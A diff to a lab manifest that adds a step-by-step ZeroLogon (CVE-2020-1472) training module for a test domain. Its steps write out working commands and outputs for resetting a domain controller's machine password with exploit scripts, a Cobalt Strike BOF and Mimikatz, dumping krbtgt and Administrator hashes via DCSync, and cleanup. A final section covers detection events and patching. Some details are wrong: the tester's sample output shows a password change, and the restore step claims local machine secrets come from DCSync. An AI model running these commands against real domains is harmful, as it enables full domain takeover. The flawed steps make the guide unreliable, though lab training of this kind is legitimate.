@@ -68,15 +68,21 @@ detection:
     - "Sysmon Event 3 (Network connection — repeated 135/RPC from same source)"
 
 targets:
+  # 2026-05-23 audit fix: ZeroLogon (CVE-2020-1472) affects Server 2008 R2
+  # through 2022 when the DC's Netlogon enforcement registry value isn't
+  # set. Previously capped at 2019; bumped to 2022 to model unpatched 2022
+  # DCs (ship with enforcement but operators can revert it for the lab).
+  # Min stays "2008" — the resolver's Windows-aware comparator handles
+  # "2008R2"/"2012R2" correctly via the year-based ordering map.
   supported_os:
     - family: windows
-      min_version: "2012"
-      max_version: "2019"
-      edition_in: ["Datacenter", "Standard"]
+      min_version: "2008"
+      max_version: "2022"
+      edition_in: []
   required_roles:
     - domain_controller
   required_services: []
-  required_domain_function_level: "2012"
+  required_domain_function_level: "2008"
 
 depends_on: []
 conflicts_with: []
@@ -188,5 +194,387 @@ cost:
   storage_mb: 0
   cpu_pct: 0
   detectability: loud
+
+curriculum:
+  title: "ZeroLogon — Netlogon AES-CFB8 auth bypass to domain takeover"
+  summary: >
+    Guided walkthrough of CVE-2020-1472 against the lab's unpatched DC
+    (`tldc01` / `10.99.50.10`). You will fingerprint the DC, run the
+    SecuraBV / Dirkjanm tester to confirm vulnerability, abuse the
+    Netlogon all-zero ClientCredential to reset `TLDC01$`'s machine
+    password, DCSync the krbtgt + ansible hashes, restore the original
+    machine password to avoid breaking the DC, and review the
+    detections the blue team should rely on.
+  learning_objectives:
+    - "Explain why setting the Netlogon ClientCredential to 8 zero bytes succeeds ~1 in 256 attempts pre-patch."
+    - "Use Dirkjanm's zerologon_tester.py to confirm vulnerability without weaponising the bug."
+    - "Reset the DC machine account password via Netlogon and DCSync krbtgt + Administrator."
+    - "Restore the original computer-account password from the local SAM/registry secret to avoid a permanent DC outage."
+    - "Map the attack to the Windows event IDs and Elastic signals defenders rely on (5805 / 4742 / 4624 anonymous LUID)."
+  prerequisites:
+    - "Network reach from the Kali attack box (192.168.1.100, tunneled through bastion.example.com) to tldc01.testlab.local on 10.99.50.10:445 + 135 + dynamic RPC"
+    - "Impacket >= 0.11 installed on Kali (`pipx install impacket` or `apt install python3-impacket`)"
+    - "Dirkjanm's zerologon_tester.py + cve-2020-1472-exploit.py cloned from https://github.com/dirkjanm/CVE-2020-1472"
+    - "An active Cobalt Strike beacon on tlws01 (10.99.50.12) running as a low-priv TESTLAB domain user — only required for the BOF alternative in step 03"
+    - "The DC has been bolt-on installed (FullSecureChannelProtection registry value removed)"
+  estimated_total_minutes: 45
+  steps:
+    - id: "01-fingerprint-dc"
+      title: "Fingerprint the DC and confirm Netlogon is reachable"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Identify the target DC
+
+        ZeroLogon needs a Netlogon-RPC endpoint and a known computer
+        account name (the DC's own NetBIOS name). From the Kali attack
+        box, confirm the DC is up and that its NetBIOS name resolves:
+
+        ```bash
+        # From Kali (192.168.1.100), tunneled into the lab
+        nmap -Pn -p 135,139,445 -sV 10.99.50.10
+        nbtscan -r 10.99.50.0/24 | grep -i dc
+        rpcdump.py @10.99.50.10 | grep -iE "netr|netlogon|MS-NRPC"
+        ```
+
+        Expected output (truncated):
+
+        ```
+        Protocol: [MS-NRPC]: Netlogon Remote Protocol
+        Provider: NETLOGON.dll
+        UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0
+        Bindings:
+                 ncacn_ip_tcp:10.99.50.10[49668]
+                 ncacn_np:\\TLDC01[\PIPE\netlogon]
+        ```
+
+        You need three things to proceed:
+        - DC FQDN: `tldc01.testlab.local`
+        - DC NetBIOS name: `TLDC01` (used as the computer-account name `TLDC01$`)
+        - DC IP: `10.99.50.10`
+
+        > **Elastic rule that fires**: none yet for pure RPC enumeration —
+        > this step is intentionally quiet. The blue team only sees a
+        > generic `nmap`-style scan signal if Endpoint is in audit mode.
+    - id: "02-vuln-check"
+      title: "Confirm the DC is ZeroLogon-vulnerable (non-destructive)"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 2 — Non-destructive vulnerability check
+
+        Dirkjanm's `zerologon_tester.py` sends 2000 Netlogon
+        `NetrServerReqChallenge` + `NetrServerAuthenticate3` pairs with
+        all-zero ClientCredentials. On a vulnerable DC roughly 1 in 256
+        succeed (the AES-CFB8 IV-equals-zero math means an all-zero
+        plaintext often encrypts to all-zero ciphertext when the IV is
+        also zero). The tester stops on the first success and does NOT
+        reset the password.
+
+        ```bash
+        # From Kali — tester is read-only / non-destructive
+        git clone https://github.com/dirkjanm/CVE-2020-1472 /opt/zerologon
+        cd /opt/zerologon
+        python3 zerologon_tester.py TLDC01 10.99.50.10
+        ```
+
+        Expected output on a vulnerable DC:
+
+        ```
+        Performing authentication attempts...
+        ===============================================================================================================================================
+        Target vulnerable, changing account password to empty string
+
+        Result: 0
+
+        Exploit complete!
+        ```
+
+        Wait — that says "changing account password". Read it carefully:
+        the **tester** stops after authentication; only the **exploit**
+        script proceeds to call `NetrServerPasswordSet2`. If the tester
+        succeeds in <2000 attempts you have confirmation. If you see
+        `STATUS_ACCESS_DENIED` on every attempt the DC is patched
+        (Feb 2021 enforcement mode is active).
+
+        > **Reference**: SecuraBV's whitepaper —
+        > https://www.secura.com/uploads/whitepapers/Zerologon.pdf —
+        > explains the AES-CFB8 with IV=0 cryptographic flaw end to end.
+
+        > **Elastic rule that fires**: no Elastic Pre-built rule maps
+        > cleanly to the brute-force Netlogon pattern (see this bolt-on's
+        > `coverage_status: no-rule` + fallback template). On the DC,
+        > Windows logs ~256 `Event 5723` (Netlogon session setup
+        > failed) entries clustered in a few seconds — that burst is
+        > the highest-fidelity hand-rolled detection.
+      assessment:
+        question: "Why does the ZeroLogon tester succeed roughly 1 in 256 attempts on a vulnerable DC, but not on every attempt?"
+        options:
+          - "The DC has a rate-limiter that allows 1 of every 256 RPC calls regardless of patch state."
+          - "The AES-CFB8 mode with an IV of zero produces an all-zero ciphertext only when the first plaintext byte of the keystream is zero — probability ~1/256."
+          - "The tester randomly picks one of 256 vulnerable RPC endpoints; only one is exposed."
+          - "Netlogon throttles the attacker IP to 1 successful auth per 256 attempts."
+        correct_index: 1
+        explanation: >
+          The bug is purely cryptographic: AES-CFB8 with an all-zero IV
+          will produce an all-zero ciphertext block whenever the first
+          keystream byte XOR plaintext byte equals zero. With a random
+          machine-account key, that happens on roughly 1 of every 256
+          authentication attempts — hence the brute-force loop. There is
+          no throttling, no endpoint roulette, and no patch-state-aware
+          rate limiter.
+    - id: "03-exploit-reset-password"
+      title: "Reset the DC machine password (DOMAIN TAKEOVER PRIMITIVE)"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 3 — Reset TLDC01$ machine account password to empty
+
+        This is the destructive step. `NetrServerPasswordSet2` rewrites
+        the machine account password to an attacker-chosen value (the
+        public PoCs choose an empty string). After this completes, the
+        DC's own AD machine account no longer matches its locally-cached
+        secret in `HKLM\SECURITY\Policy\Secrets\$MACHINE.ACC` — you must
+        restore it (Step 5) or the DC will fail to authenticate to itself
+        and replication will break.
+
+        **Option A — Impacket (Kali attack box, preferred for cleanliness)**:
+
+        ```bash
+        # From Kali
+        cd /opt/zerologon
+        python3 cve-2020-1472-exploit.py TLDC01 10.99.50.10
+        ```
+
+        Expected output:
+
+        ```
+        Performing authentication attempts...
+        ====================================================================
+        Target vulnerable, changing account password to empty string
+        Result: 0
+        Exploit complete!
+        ```
+
+        **Option B — Cobalt Strike BOF (run from beacon on tlws01)**:
+
+        Outflank's C2 Tool Collection ships a `zerologon` BOF in their
+        Lateral Movement set. Load it into the beacon (assumed already
+        running on tlws01 as TESTLAB\lowpriv from the prerequisites):
+
+        ```
+        # In CS client connected to your beacon on tlws01
+        beacon> inline-execute /opt/C2-Tool-Collection/BOF/Zerologon/zerologon.x64.o TLDC01 10.99.50.10
+        ```
+
+        Repo: https://github.com/outflanknl/C2-Tool-Collection (BOF
+        directory). TrustedSec's CS-Situational-Awareness-BOF has a
+        complementary `nl_test_serversecurechannel` BOF for the
+        vulnerability check side.
+
+        **Option C — Mimikatz PowerShell wrapper (last resort, loud)**:
+
+        ```powershell
+        # From beacon on tlws01 — Mimikatz module
+        Invoke-Mimikatz -Command '"lsadump::zerologon /target:tldc01.testlab.local /account:TLDC01$ /exploit"'
+        ```
+
+        After any of these succeed, the DC's machine password is empty.
+
+        > **Elastic rule that fires**: `Suspicious Computer Account Name
+        > Change CVE-2020-1472` (custom rule — most environments hand-roll
+        > this on Event 4742 with `AccountType=Machine` and a blank
+        > password hash). Out-of-the-box Elastic-prebuilt rule named
+        > `Anomalous Process For a Windows Population` may fire if the
+        > Mimikatz variant is used. See `signal_sources` in this
+        > bolt-on's `detection` block for the canonical EventIDs.
+    - id: "04-dcsync"
+      title: "DCSync krbtgt + Administrator using the empty machine password"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 4 — Use the empty password to DCSync
+
+        With TLDC01$ now having an empty NTLM password (hash:
+        `31d6cfe0d16ae931b73c59d7e0c089c0`), authenticate as the DC's
+        own machine account and request the krbtgt + Administrator hashes
+        via the MS-DRSR replication protocol.
+
+        ```bash
+        # From Kali — Impacket secretsdump using the empty hash
+        secretsdump.py -no-pass -just-dc \
+            -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
+            'TESTLAB/TLDC01$@10.99.50.10'
+        ```
+
+        Expected (truncated) output:
+
+        ```
+        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+        [*] Using the DRSUAPI method to get NTDS.DIT secrets
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18c42bcbf6c3a9055f:::
+        TESTLAB\ansible:1108:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+        ...
+        ```
+
+        You now own:
+        - `Administrator` NT hash → pass-the-hash to anywhere in TESTLAB
+        - `krbtgt` NT hash → mint Golden Tickets indefinitely (until next krbtgt rotation)
+        - `TESTLAB\ansible` NT hash → automation-tier credentials
+
+        **Alternative via beacon BOF**: TrustedSec's `CS-Remote-OPs-BOF`
+        ships `dcsync.x64.o`. Load Mimikatz module or invoke the BOF
+        with `-just-dc-user krbtgt`:
+
+        ```
+        beacon> inline-execute /opt/CS-Remote-OPs-BOF/SourceCode/dcsync/dcsync.x64.o TESTLAB.LOCAL krbtgt
+        ```
+
+        Repo: https://github.com/trustedsec/CS-Remote-OPs-BOF
+      assessment:
+        question: "After Step 3 succeeds, what credential do you authenticate as in Step 4 — and why does this give you full DC replication rights?"
+        options:
+          - "TESTLAB\\Administrator with the empty password — Administrator is the default DC backdoor."
+          - "TESTLAB\\TLDC01$ machine account with the empty NTLM hash — domain controllers have implicit replication rights to themselves."
+          - "TESTLAB\\krbtgt with the rotated hash — krbtgt always has replication."
+          - "A new local account created during the Netlogon exploit."
+        correct_index: 1
+        explanation: >
+          Domain controller machine accounts (TLDC01$ in this case) are
+          members of the `Enterprise Domain Controllers` well-known SID
+          group, which is granted the `DS-Replication-Get-Changes` and
+          `DS-Replication-Get-Changes-All` extended rights at the domain
+          NC root. Authenticating AS the DC's own machine account
+          inherits those rights, so DRSUAPI / DCSync just works — no
+          Administrator credentials needed at this stage. That is why
+          ZeroLogon is a single-shot domain takeover.
+    - id: "05-restore-password"
+      title: "Restore the original machine password (critical cleanup)"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — Avoid permanently bricking the DC
+
+        The DC's local secret store (`HKLM\SECURITY\Policy\Secrets\$MACHINE.ACC`)
+        still has the ORIGINAL password from before the exploit. AD now
+        thinks the machine account password is empty. This mismatch will
+        eventually break Netlogon, Group Policy processing, and
+        AD replication — sometimes within minutes, sometimes after a
+        scheduled secure-channel refresh (~30 days).
+
+        Recover the original password hash from LSA secrets via the DCSync
+        you just performed, then push it back to AD:
+
+        ```bash
+        # From Kali — extract the local $MACHINE.ACC secret over DRSUAPI
+        secretsdump.py -no-pass -just-dc-user 'TLDC01$' \
+            -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
+            'TESTLAB/TLDC01$@10.99.50.10'
+
+        # Note the previous hash field — copy the *_history NT hash if present
+        # Then use Dirkjanm's restorepassword.py:
+        python3 /opt/zerologon/restorepassword.py TLDC01@TLDC01 \
+            -target-ip 10.99.50.10 \
+            -hexpass <ORIGINAL_HEX_PASSWORD_FROM_DCSYNC>
+        ```
+
+        Expected:
+
+        ```
+        [*] StringBinding ncacn_np:10.99.50.10[\PIPE\netlogon]
+        [*] Authenticating to 10.99.50.10
+        [+] Success! Cleartext password reset
+        ```
+
+        Reboot `tldc01` after restoration — Netlogon caches secure-channel
+        state in-memory and a service restart of Netlogon + KDC is the
+        safest path:
+
+        ```powershell
+        # Via SSM from operator workstation
+        aws ssm send-command --instance-ids i-0abc...tldc01 \
+            --document-name AWS-RunPowerShellScript \
+            --parameters 'commands=["Restart-Service Netlogon -Force"]' \
+            --region us-east-1
+        ```
+
+        > **If you skip this step**: the DC will eventually fall out of
+        > the domain. Recovery requires booting into DSRM and resetting
+        > the machine password manually with `netdom resetpwd`. Don't
+        > skip it.
+
+        > **Elastic rule that fires**: `Unusual Computer Account Password
+        > Change` — fires on the Event 4742 from a non-DC source
+        > resetting another DC's machine account password.
+    - id: "06-detect-and-mitigate"
+      title: "Blue-team telemetry and the patch story"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 6 — Detection and remediation
+
+        ### What defenders should look for
+
+        Stack the following on a Kibana dashboard scoped to all
+        `domain_controller`-roled hosts (tldc01 in this lab):
+
+        | Signal | Source | Why it matters |
+        |---|---|---|
+        | Event 5723 burst (>50 in 60s) | Windows-Netlogon Operational | The brute-force loop — 1/256 success rate means ~255 failures per success |
+        | Event 4742 with empty password hash | Security log | The actual `NetrServerPasswordSet2` write |
+        | Event 4624 type 3 with NULL session SID | Security log | Anonymous Netlogon channel used by the PoC |
+        | DRSUAPI calls from DC's own IP | Sysmon Event 3 / network | DCSync immediately following a 4742 |
+
+        The bolt-on ships `coverage_status: no-rule` — no Elastic
+        prebuilt rule covers ZeroLogon directly at time of authoring.
+        The fallback template at
+        `webapp/bolton/rule_templates/zerologon-netlogon.j2.yml`
+        materialises the 5723-burst + 4742-with-empty-hash correlation.
+
+        ### The patch story
+
+        Microsoft shipped the fix in two stages:
+
+        1. **August 2020 (KB4577668)** — adds the enforcement logic but
+           leaves it **opt-in** via the `FullSecureChannelProtection=1`
+           registry value. Most environments did not deploy this.
+        2. **February 9, 2021 (KB4601345)** — enforcement mode is enabled
+           by default. Vulnerable down-level Windows / non-Windows
+           machines (Samba < 4.13, network appliances, NAS devices) lose
+           the secure channel. Operators must whitelist them via the
+           GPO `Domain controller: Allow vulnerable Netlogon secure
+           channel connections` BEFORE deploying.
+
+        Click the **Patch** action on this bolt-on's card row to apply.
+        Note this manifest declares `rollback_supported: false` — KBs
+        cannot be cleanly uninstalled. Re-arming the lab requires
+        restoring the DC from a pre-patch snapshot.
+
+        ### Mitigations beyond the patch
+
+        - Add domain controllers to the **Protected Users** group only
+          where supported (some down-level apps break).
+        - Monitor `FullSecureChannelProtection` value on every DC — a
+          value of 0 or absent is the install-side signal for this
+          bolt-on. Treat any change as P1.
+        - Reduce DC machine-account attack surface: restrict Netlogon
+          RPC (135/dynamic) to known operator/management subnets via
+          host firewall.
+
+        > **Elastic rule that fires (mitigation phase)**:
+        > `Modification of Domain Controller Account Password Policy` —
+        > the legitimate KB rollout fires this rule too, which is why
+        > defenders should pair it with a change-control allowlist.
+      assessment:
+        question: "Which artefact is the highest-fidelity indicator that ZeroLogon was actually EXPLOITED (vs scanned)?"
+        options:
+          - "Event 5723 — a single Netlogon session setup failure"
+          - "Event 4742 showing the DC's machine account password set to a value with NT hash 31d6cfe0d16ae931b73c59d7e0c089c0 (empty)"
+          - "Event 4624 type 3 logon from any source"
+          - "Event 4768 — Kerberos TGT requested"
+        correct_index: 1
+        explanation: >
+          Event 4742 (Computer Account Changed) for the DC's own machine
+          account, with the resulting NT hash equal to the empty-password
+          hash `31d6cfe0d16ae931b73c59d7e0c089c0`, is the smoking gun.
+          5723 fires constantly in noisy environments; 4624 and 4768 are
+          baseline events. Only 4742 with that specific empty-hash value
+          definitively shows the Netlogon password reset succeeded.
 
 status: stable
